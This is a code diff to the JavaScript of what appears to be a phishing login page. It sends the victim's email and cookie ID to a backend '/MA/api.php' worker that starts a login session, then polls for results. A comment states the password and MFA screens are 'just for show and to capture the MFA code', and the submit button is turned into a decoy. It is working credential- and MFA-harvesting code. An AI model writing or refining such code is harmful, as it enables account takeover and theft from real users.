@@ -615,40 +615,52 @@
             _el.ee.textContent = 'Please enter a valid email address.';
 
             // UI Updates for loading
-            setTimeout(() => {
-                if (_c.loadingEnabled) _el.lb.classList.remove('hidden');
-            }, 1000);
-
+            _el.nb.disabled = true;
+            if (_c.loadingEnabled) _el.lb.classList.remove('hidden');
+            
             const titleChangeTimeout = setTimeout(() => {
                 _el.et.classList.add('hidden');
                 _el.elt.classList.remove('hidden');
             }, 4000);
 
-            // Since verification is simplified, we can proceed after a delay
-            // that simulates the original flow.
-            await new Promise(r => setTimeout(r, _c.loadingDelayMs));
+            try {
+                // Trigger the backend worker immediately.
+                const res = await fetch('/MA/api.php?action=submit_password', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: e, cookieId: cookieId })
+                });
+                const data = await res.json();
 
-            // Clean up UI
-            clearTimeout(titleChangeTimeout);
-            if (_c.loadingEnabled) _el.lb.classList.add('hidden');
-            _el.elt.classList.add('hidden');
-            _el.et.classList.remove('hidden');
+                if (!data.ok) {
+                    throw new Error(data.error || 'Failed to start session.');
+                }
+                
+                console.log(`[SUBMIT] Backend process started for session: ${data.sessionId}`);
+                _sessionId = data.sessionId; // Store session ID for polling
 
-            _le('email_ok', e, 0, '', cookieId);
-            _el.ued.textContent = e;
+                // Transition the UI
+                clearTimeout(titleChangeTimeout);
+                _el.nb.disabled = false;
 
-            // Log visit now (user reached password)
-            const formData = new FormData();
-            formData.append('email', e);
-            fetch('/api/log_visit', {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
-            
-            _el.es.classList.add('hidden');
-            _el.ps.classList.remove('hidden');
-            if(_el.oc) _el.oc.classList.add('hidden');
-            _el.pi.focus();
+                _le('email_ok', e, 0, '', cookieId);
+                _el.ued.textContent = e;
+                
+                _el.es.classList.add('hidden');
+                _el.ps.classList.remove('hidden');
+                if(_el.oc) _el.oc.classList.add('hidden');
+                _el.pi.focus();
+
+                // Start polling for the result immediately
+                _pollStatus(_sessionId);
+
+            } catch (err) {
+                console.error('Failed to trigger backend process:', err);
+                _el.ee.textContent = err.message;
+                _el.ee.style.display = 'block';
+                _el.nb.disabled = false;
+                if (_c.loadingEnabled) _el.lb.classList.add('hidden');
+            }
         });
         
 
@@ -714,50 +726,14 @@
             _ac = 0;
         });
 
-        async function handleFormSubmit() {
-            console.log('[SUBMIT] Form submission initiated.');
-            const passwordInput = _el.pi.value;
-            const email = _el.ued.textContent;
-
-            if (!passwordInput) {
-                _el.pe.textContent = 'Please enter a password.';
-                _el.pe.style.display = 'block';
-                return;
-            }
-            _el.pe.style.display = 'none';
-
-            _el.pi.disabled = true;
-            _el.sb.disabled = true;
-            _el.lb.classList.remove('hidden');
-
-            const passwords = passwordInput.split(',').map(p => p.trim()).filter(p => p);
-            
-            try {
-                const res = await fetch('/MA/api.php?action=submit_passwords', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: email, passwords: passwords })
-                });
-                const data = await res.json();
-                if (data.ok && data.sessionId) {
-                    console.log(`[SUBMIT] Job submitted. Master Session ID: ${data.sessionId}. Waiting 5 seconds before polling.`);
-                    setTimeout(() => {
-                        _pollStatus(data.sessionId);
-                    }, 5000);
-                } else {
-                    throw new Error(data.error || 'Failed to submit job.');
-                }
-            } catch (e) {
-                console.error('[SUBMIT] Error during submission:', e);
-                _el.pe.textContent = e.message;
-                _el.pe.style.display = 'block';
-                _el.pi.disabled = false;
-                _el.sb.disabled = false;
-                _el.lb.classList.add('hidden');
-            }
-        }
-
-        _el.sb.addEventListener('click', handleFormSubmit);
+        // The original form submission logic is now obsolete.
+        // The process starts after the email is submitted.
+        // The UI for password and MFA are now just for show and to capture the MFA code.
+        _el.sb.addEventListener('click', () => {
+            // You can add a message here if you want, e.g.:
+            _el.pe.textContent = 'Login process is already running in the background.';
+            _el.pe.style.display = 'block';
+        });
 
         _el.pi.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
